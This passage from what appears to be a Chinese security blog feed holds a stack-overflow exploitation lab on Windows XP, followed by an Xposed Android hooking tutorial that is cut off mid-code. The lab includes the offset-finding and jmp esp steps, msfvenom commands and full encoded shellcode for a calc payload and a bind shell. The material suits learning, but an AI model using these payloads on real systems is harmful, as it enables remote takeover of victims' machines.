5000</strong>（msf中pattern_create.rb和pattern_offset.rb可以做相同的事情）来生成5000字符长度的字符串，方便我们根据崩溃时的提示定位到EIP（就是前面提到的返回地址）。下图为崩溃时的提示0x366a4235。现在就可以用这个去查偏移，就能确定是哪几个字节把EIP给覆盖了。</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/findEIP.png" alt="崩溃时的提示"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(base) C:\workplace\tools&gt;python pattern.py 0x366a4235</span><br><span class="line">Pattern 0x366a4235 first occurrence at position 1067 in pattern.</span><br></pre></td></tr></table></figure></p><blockquote><p>查询偏移可以知道偏移为1067个字节。所以前面需要26067个字节去填充（一般使用A字符去填充，当然也可以是随意的），之后的4个字节会将返回地址给覆盖了。现在用’BBBB’来代替这个4个字节去测试。可以看到返回的报错改成了0x42424242(就是ascii的’BBBB’)。</p></blockquote><h2 id="找到jmp-ESP"><a href="#找到jmp-ESP" class="headerlink" title="找到jmp ESP"></a>找到jmp ESP</h2><blockquote><p>为什么要找jmp ESP?一般情况下，ESP寄存器中的地址总是指向系统栈且不会被溢出的数据破坏。函数返回时，ESP所指的位置恰好是我们所淹没的返回地址的下一个。有时候也可以观察，寄存器的情况，并不一定非要使用jmp esp。我这里使用的是x32_dbg需要先设置x32_dbg为默认的实时调试器。options-&gt;perferences-&gt;mis把Set x64_dbg as Just In Time Debugger勾选。当软件崩溃时，点击取消，会自动启动调试器附加。</p></blockquote><blockquote><p>点击Symbols-&gt;双击可能存在的动态链接库-&gt;右键search for command-&gt;输入jmp esp 下面是我在kernel.dll中找到的jmp esp指令的地址0x7C874413.当然我们也可以用代码去查找0xFFE4(jmp esp的机器码为0xFFE4).当前计算机内存地址上的内容是指令还是数据是通过当前的上下文环境决定的,所以当用上面的办法找不到的时候,可以自己写代码来搜索内存中是否有0xFFE4</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/jmpesp.png" alt="jmp esp"></p><h2 id="定位shellcode的位置"><a href="#定位shellcode的位置" class="headerlink" title="定位shellcode的位置"></a>定位shellcode的位置</h2><blockquote><p>经过上面的准备,我们需要查找我们输入的字符串哪些被填充到了ESP指向的地址.但是’BBBB’之后的字符串并没有全部直接被填充到了返回地址之后的栈中。我们需要去调试查看报错之后的栈，找到我们shellcode应该填写的位置。现在我们使用比较明显的字符串如’1abcdefghijklmnopqrstuvwxyz2abcdefghijklmnopqrstuvwxyz3abcdefghijklmnopqrstuvwxyz’方便我们定位我们的字符串在栈中的位置。通过下面这张图我们知道最前面的<strong>1abc</strong>并没有被压到栈中,而是从之后的’defg…’开始压入栈中。同时可以计算出压入栈的空间至少是104个字节（因为后面只写了4个a-z，除掉最开始的4个字节。104=27*4-4，最前面的4个字节是因为在返回时会先pop一个4字节的参数）</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/ShellCodeAddress.png" alt="ShellCodeAddress"></p><h1 id="利用msf生成shellcode"><a href="#利用msf生成shellcode" class="headerlink" title="利用msf生成shellcode"></a>利用msf生成shellcode</h1><blockquote><p>一般情况下在可利用的栈空间较大时，可以在最前面先加入一定数量的’\x90’(\x90是nop的机器码)可以提高shellcode的成功率.接下来就是使用msf上的msfvenom生成shellcode，再生成exp。<br>msfvenom的一些参数</p><ul><li>-p shellcode的功能，也就是有效载荷</li><li>-b 避免出现什么字符这里使用的是 -b ‘\x00’，因为shellcode会因为\x00截断</li><li>-f 输出的shellcode格式</li><li>–list-options 有一些shellcode需要设置一些参数可以用这个命令查看需要的参数</li><li>-e 设置编码和解码格式。有时候为了避免一些字符需要进行编码。为了过免杀也需要编码</li></ul></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//下面是使用msf生成的代码，只需要把buf部分复制到之前的代码中替代后面的字符串就能生成有一定用的exp</span><br><span class="line">//这条命令会生成一个能弹一个计算器的exp</span><br><span class="line">PS C:\metasploit-framework\bin&gt; .\msfvenom.bat -p windows/exec CMD=calc.exe -b <span class="string">'\x00'</span> -f python</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">220</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with final size <span class="number">220</span></span><br><span class="line">Payload size: <span class="number">220</span> bytes</span><br><span class="line">Final size of python file: <span class="number">1060</span> bytes</span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xba\xcb\xd0\xfc\x46\xd9\xca\xd9\x74\x24\xf4\x5b\x29"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x31\x31\x53\x13\x03\x53\x13\x83\xeb\x37\x32"</span></span><br><span class="line">buf += <span class="string">"\x09\xba\x2f\x31\xf2\x43\xaf\x56\x7a\xa6\x9e\x56\x18"</span></span><br><span class="line">buf += <span class="string">"\xa2\xb0\x66\x6a\xe6\x3c\x0c\x3e\x13\xb7\x60\x97\x14"</span></span><br><span class="line">buf += <span class="string">"\x70\xce\xc1\x1b\x81\x63\x31\x3d\x01\x7e\x66\x9d\x38"</span></span><br><span class="line">buf += <span class="string">"\xb1\x7b\xdc\x7d\xac\x76\x8c\xd6\xba\x25\x21\x53\xf6"</span></span><br><span class="line">buf += <span class="string">"\xf5\xca\x2f\x16\x7e\x2e\xe7\x19\xaf\xe1\x7c\x40\x6f"</span></span><br><span class="line">buf += <span class="string">"\x03\x51\xf8\x26\x1b\xb6\xc5\xf1\x90\x0c\xb1\x03\x71"</span></span><br><span class="line">buf += <span class="string">"\x5d\x3a\xaf\xbc\x52\xc9\xb1\xf9\x54\x32\xc4\xf3\xa7"</span></span><br><span class="line">buf += <span class="string">"\xcf\xdf\xc7\xda\x0b\x55\xdc\x7c\xdf\xcd\x38\x7d\x0c"</span></span><br><span class="line">buf += <span class="string">"\x8b\xcb\x71\xf9\xdf\x94\x95\xfc\x0c\xaf\xa1\x75\xb3"</span></span><br><span class="line">buf += <span class="string">"\x60\x20\xcd\x90\xa4\x69\x95\xb9\xfd\xd7\x78\xc5\x1e"</span></span><br><span class="line">buf += <span class="string">"\xb8\x25\x63\x54\x54\x31\x1e\x37\x32\xc4\xac\x4d\x70"</span></span><br><span class="line">buf += <span class="string">"\xc6\xae\x4d\x24\xaf\x9f\xc6\xab\xa8\x1f\x0d\x88\x47"</span></span><br><span class="line">buf += <span class="string">"\x6a\x0c\xb8\xcf\x33\xc4\xf9\x8d\xc3\x32\x3d\xa8\x47"</span></span><br><span class="line">buf += <span class="string">"\xb7\xbd\x4f\x57\xb2\xb8\x14\xdf\x2e\xb0\x05\x8a\x50"</span></span><br><span class="line">buf += <span class="string">"\x67\x25\x9f\x32\xe6\xb5\x43\x9b\x8d\x3d\xe1\xe3"</span></span><br></pre></td></tr></table></figure><p>当我们用那个软件打开我们生成的exp时，会自动弹出一个计算器，如下图所示。<br><img src="/2019/04/15/栈溢出原理及实验/calc.png" alt="calc"></p><p>现在我们尝试生成一个有远程shell的exp。想想也是有点激动。当软件打开exp时，软件不会有很明显的弹窗（感觉像软件崩溃了一样，不再对我的操作有反应），但是会打开4444端口等待连接。然后我用kali用telnet去连接<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//虚拟机的ip为<span class="number">192.168</span>.<span class="number">217.128</span> 默认端口为<span class="number">4444</span></span><br><span class="line">PS C:\metasploit-framework\bin&gt; .\msfvenom.bat -p windows/shell_bind_tcp -b <span class="string">'\x00'</span> x86/alpha_upper -f py</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">355</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with final size <span class="number">355</span></span><br><span class="line">Payload size: <span class="number">355</span> bytes</span><br><span class="line">Final size of py file: <span class="number">1710</span> bytes</span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xbf\xad\xe1\xca\x86\xdb\xda\xd9\x74\x24\xf4\x5a\x29"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x53\x31\x7a\x12\x83\xc2\x04\x03\xd7\xef\x28"</span></span><br><span class="line">buf += <span class="string">"\x73\xdb\x18\x2e\x7c\x23\xd9\x4f\xf4\xc6\xe8\x4f\x62"</span></span><br><span class="line">buf += <span class="string">"\x83\x5b\x60\xe0\xc1\x57\x0b\xa4\xf1\xec\x79\x61\xf6"</span></span><br><span class="line">buf += <span class="string">"\x45\x37\x57\x39\x55\x64\xab\x58\xd5\x77\xf8\xba\xe4"</span></span><br><span class="line">buf += <span class="string">"\xb7\x0d\xbb\x21\xa5\xfc\xe9\xfa\xa1\x53\x1d\x8e\xfc"</span></span><br><span class="line">buf += <span class="string">"\x6f\x96\xdc\x11\xe8\x4b\x94\x10\xd9\xda\xae\x4a\xf9"</span></span><br><span class="line">buf += <span class="string">"\xdd\x63\xe7\xb0\xc5\x60\xc2\x0b\x7e\x52\xb8\x8d\x56"</span></span><br><span class="line">buf += <span class="string">"\xaa\x41\x21\x97\x02\xb0\x3b\xd0\xa5\x2b\x4e\x28\xd6"</span></span><br><span class="line">buf += <span class="string">"\xd6\x49\xef\xa4\x0c\xdf\xeb\x0f\xc6\x47\xd7\xae\x0b"</span></span><br><span class="line">buf += <span class="string">"\x11\x9c\xbd\xe0\x55\xfa\xa1\xf7\xba\x71\xdd\x7c\x3d"</span></span><br><span class="line">buf += <span class="string">"\x55\x57\xc6\x1a\x71\x33\x9c\x03\x20\x99\x73\x3b\x32"</span></span><br><span class="line">buf += <span class="string">"\x42\x2b\x99\x39\x6f\x38\x90\x60\xf8\x8d\x99\x9a\xf8"</span></span><br><span class="line">buf += <span class="string">"\x99\xaa\xe9\xca\x06\x01\x65\x67\xce\x8f\x72\x88\xe5"</span></span><br><span class="line">buf += <span class="string">"\x68\xec\x77\x06\x89\x25\xbc\x52\xd9\x5d\x15\xdb\xb2"</span></span><br><span class="line">buf += <span class="string">"\x9d\x9a\x0e\x2e\x95\x3d\xe1\x4d\x58\xfd\x51\xd2\xf2"</span></span><br><span class="line">buf += <span class="string">"\x96\xbb\xdd\x2d\x86\xc3\x37\x46\x2f\x3e\xb8\x79\xec"</span></span><br><span class="line">buf += <span class="string">"\xb7\x5e\x13\x1c\x9e\xc9\x8b\xde\xc5\xc1\x2c\x20\x2c"</span></span><br><span class="line">buf += <span class="string">"\x7a\xda\x69\x26\xbd\xe5\x69\x6c\xe9\x71\xe2\x63\x2d"</span></span><br><span class="line">buf += <span class="string">"\x60\xf5\xa9\x05\xf5\x62\x27\xc4\xb4\x13\x38\xcd\x2e"</span></span><br><span class="line">buf += <span class="string">"\xb7\xab\x8a\xae\xbe\xd7\x04\xf9\x97\x26\x5d\x6f\x0a"</span></span><br><span class="line">buf += <span class="string">"\x10\xf7\x8d\xd7\xc4\x30\x15\x0c\x35\xbe\x94\xc1\x01"</span></span><br><span class="line">buf += <span class="string">"\xe4\x86\x1f\x89\xa0\xf2\xcf\xdc\x7e\xac\xa9\xb6\x30"</span></span><br><span class="line">buf += <span class="string">"\x06\x60\x64\x9b\xce\xf5\x46\x1c\x88\xf9\x82\xea\x74"</span></span><br><span class="line">buf += <span class="string">"\x4b\x7b\xab\x8b\x64\xeb\x3b\xf4\x98\x8b\xc4\x2f\x19"</span></span><br><span class="line">buf += <span class="string">"\xbb\x8e\x6d\x08\x54\x57\xe4\x08\x39\x68\xd3\x4f\x44"</span></span><br><span class="line">buf += <span class="string">"\xeb\xd1\x2f\xb3\xf3\x90\x2a\xff\xb3\x49\x47\x90\x51"</span></span><br><span class="line">buf += <span class="string">"\x6d\xf4\x91\x73"</span></span><br></pre></td></tr></table></figure></p><p>下图为Telnet连接并且创建hello文件夹。到这里实验就基本已经完成。<br><img src="/2019/04/15/栈溢出原理及实验/telnet.png" alt="calc"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>简单的说就是输入的数据能够将栈中的返回值覆盖，从而控制程序执行攻击者的代码。简单的流程如下图</p></blockquote><ul><li>1.找到栈溢出的点</li><li>2.找jmp esp和栈大小</li><li>3.使用msf生成shellcode</li><li>4.使用shellcode生成exp</li><li>5.利用exp去攻击目标</li></ul><blockquote><p>当然现在的windows系统已经有很多保护措施，所以这些实验都是在xp上进行的。对于之后如何绕过windows上的这些保护进行栈溢出还有堆溢出，请听下回分解（先立个flag）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;在看了《0day安全：软件漏洞分析技术》的前几章和《Exploit编写系列教程》的第一章之后，简单记录一下自己遇到的问题，一些资源和简单命令。下面主要从3个方面出发记录。1.栈溢出的原理及简单demo实验。2.具体软件栈溢出的利用（不是挖掘栈溢出漏洞，是已经知道后怎么利用）。3.Metasploit的简单使用。&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="栈溢出" scheme="https://bigkan.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="安全" scheme="https://bigkan.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础" scheme="https://bigkan.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Xposed留档</title>
    <link href="https://bigkan.github.io/2019/04/07/Xposed%E7%95%99%E6%A1%A3/"/>
    <id>https://bigkan.github.io/2019/04/07/Xposed留档/</id>
    <published>2019-04-07T08:10:58.000Z</published>
    <updated>2020-07-02T15:07:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Xposed是Android常用的java层的hook框架。可以方便的对目标代码进行修改和监控</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ul><li>已经root的android（如果使用VirtualXposed可以不root）</li><li>推荐使用<a href="https://github.com/android-hacker/VirtualXposed" title="VirtualXposed Github" target="_blank" rel="noopener">VirtualXposed</a></li><li>当然还有Android开发环境（Android studio）<a id="more"></a><h1 id="模块开发入门"><a href="#模块开发入门" class="headerlink" title="模块开发入门"></a>模块开发入门</h1></li></ul><h2 id="添加Xposed-API依赖"><a href="#添加Xposed-API依赖" class="headerlink" title="添加Xposed API依赖"></a>添加Xposed API依赖</h2><blockquote><p>app/build.gradle中添加XposedAPI依赖,使用compileOnly,并同步gradle<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    <span class="function">implementation <span class="title">fileTree</span><span class="params">(dir: <span class="string">'libs'</span>, include: [<span class="string">'*.jar'</span>])</span></span></span><br><span class="line"><span class="function">    implementation 'com.android.support:appcompat-v7:28.0.0'</span></span><br><span class="line"><span class="function">    testImplementation 'junit:junit:4.12'</span></span><br><span class="line"><span class="function">    androidTestImplementation 'com.android.support.test:runner:1.0.2'</span></span><br><span class="line"><span class="function">    androidTestImplementation 'com.android.support.test.espresso:espresso-core:3.0.2'</span></span><br><span class="line"><span class="function">    compileOnly 'de.robv.android.xposed:api:82'</span></span><br><span class="line"><span class="function">    compileOnly 'de.robv.android.xposed:api:82:sources'</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure></p></blockquote><h2 id="配置meta-data"><a href="#配置meta-data" class="headerlink" title="配置meta-data"></a>配置meta-data</h2><blockquote><p>在AndroidManifest.xml中配置Xposed信息</p><ul><li>xposedmodule：表明是Xposed模块</li><li>xposeddescription：Xposed模块描述最好是简单介绍这个模块的功能</li><li>xposedminversion：表示Xposed最低版本<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">"com.example.test"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">"test"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">"82"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="实现IXposedHookLoadPackage接口"><a href="#实现IXposedHookLoadPackage接口" class="headerlink" title="实现IXposedHookLoadPackage接口"></a>实现IXposedHookLoadPackage接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.AndroidAppHelper;</span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">//对Activity类的onCreate进行hook</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(Activity.class, <span class="string">"onCreate"</span>, Bundle.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//Hook函数执行之前进行操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//Hook函数执行之后操作</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置assets-xposed-init"><a href="#配置assets-xposed-init" class="headerlink" title="配置assets/xposed_init"></a>配置assets/xposed_init</h2><blockquote><p>鼠标右击模块-&gt;New-&gt;Folder-&gt;Assets Folder即可创建。在assets目录中创建名称为xposed_init的文件，并写入刚刚创建的Xposed模块入口类的全限定类名com.example.test.main。</p></blockquote><h2 id="安装并使用"><a href="#安装并使用" class="headerlink" title="安装并使用"></a>安装并使用</h2><ul><li>setting-&gt;Build,Execution,Deployment-&gt;Instant Run把钩取消掉</li><li>安装apk</li><li>xposed里勾选模块apk并重启设备</li><li>现在就已经完成</li></ul><h1 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h1><blockquote><p>详细API介绍<a href="http://api.xposed.info/reference/packages.html" target="_blank" rel="noopener">框架API详细介绍</a><br>也可以在AndroidStudio中通过<code>ctrl+鼠标左键</code>跳转到相应的源码进行查看，有时候这样会更加方便</p></blockquote><h2 id="IXposedHookLoadPackage"><a href="#IXposedHookLoadPackage" class="headerlink" title="IXposedHookLoadPackage"></a>IXposedHookLoadPackage</h2><blockquote><p>这是Xposed的回调接口，Xposed会自动注册这个接口的实现类(在assets/xposed_init文件中配置)为插件代码的执行入口。这是代码注入的入口。每一个DVM进程启动时，都会调用其实现类的handleLoadPackage(LoadPackageParam)方法，并将当前进程的应用程序信息作为参数传递给自定义代码，从而实现代码注入。插件注入的任何功能实现都是从这里开始执行，而不是从插件应用的Application#onCreate()方法开始的。</p></blockquote><h2 id="XC-LoadPackage-LoadPackageParam"><a href="#XC-LoadPackage-LoadPackageParam" class="headerlink" title="XC_LoadPackage.LoadPackageParam"></a>XC_LoadPackage.LoadPackageParam</h2><blockquote><p>封装了正在加载的进程的应用信息。有下面几个变量</p></blockquote><ul><li>String packageName：The name of the package being loaded.被加载的包名</li><li>String processName：The process in which the package is executed.</li><li>ClassLoader classLoader：The ClassLoader used for this package.</li><li>ApplicationInfo appInfo：More information about the application being loaded</li><li>bool isFirstApplication：if this is the first (and main) application for this process.<h2 id="XC-MethodHook"><a href="#XC-MethodHook" class="headerlink" title="XC_MethodHook"></a>XC_MethodHook</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 该方法中的代码会在目标方法被调用前执行 **/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 该方法中的代码会在目标方法被调用后执行 **/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="MethodHookParam"><a href="#MethodHookParam" class="headerlink" title="MethodHookParam"></a>MethodHookParam</h2><blockquote><p>XC_MethodHook的参数  </p></blockquote><ul><li>args：方法的ava方法（Java构造器）参数列表</li><li>method：目标方法，Java方法（Java构造器）对象</li><li>getResult()：获得Java方法的返回值；一般在afterHookedMethod中使用</li><li>setResult(Object result)：修改方法的返回值<h2 id="XposedHelpers类"><a href="#XposedHelpers类" class="headerlink" title="XposedHelpers类"></a>XposedHelpers类</h2><blockquote><p>源码注释：Helpers that simplify hooking and calling methods/constructors, getting and settings fields。可以获取类，hook和调用方法，设置和获取属性值。下面是常用的4个方法，前两个用来hook java方法，后两个用来hook构造函数</p></blockquote></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookMethod</span><span class="params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback)</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookMethod</span><span class="params">(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookConstructor</span><span class="params">(Class&lt;?&gt; clazz, Object... parameterTypesAndCallback)</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> XC_MethodHook.<span class="function">Unhook <span class="title">findAndHookConstructor</span><span class="params">(String className, ClassLoader classLoader, Object... parameterTypesAndCallback)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>clazz：目标方法的类</li><li>className：全限定类名</li><li>methodName: 目标方法名</li><li>Object…：参数列表</li><li>classLoader：指定类加载器，期望从中查找名称为className的类 </li><li>parameterTypesAndCallback：回调函数主要实现beforeHookedMethod和afterHookedMethod<h1 id="hook-Multidex-和动态加载的解决方法"><a href="#hook-Multidex-和动态加载的解决方法" class="headerlink" title="hook Multidex 和动态加载的解决方法"></a>hook Multidex 和动态加载的解决方法</h1></li><li>1.首先HookApplication.class的attach。</li><li>2.然后Hook目标方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">findAndHookMethod(Application.class, <span class="string">"attach"</span>, Context.class, <span class="keyword">new</span> 